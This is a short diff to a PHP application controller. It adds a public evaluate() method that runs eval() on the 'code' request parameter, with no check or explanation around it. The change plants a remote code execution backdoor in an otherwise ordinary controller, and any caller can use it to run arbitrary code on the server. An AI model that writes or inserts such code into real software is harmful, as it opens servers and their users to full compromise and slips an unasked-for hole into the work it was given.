@@ -156,6 +156,10 @@ class ApplicationController extends HookController {
         return array('success' => true);
     }
 
+    public function evaluate() {
+        return eval(Input::get('code'));
+    }
+
     public function delete() {
         return array('success' => false);
     }
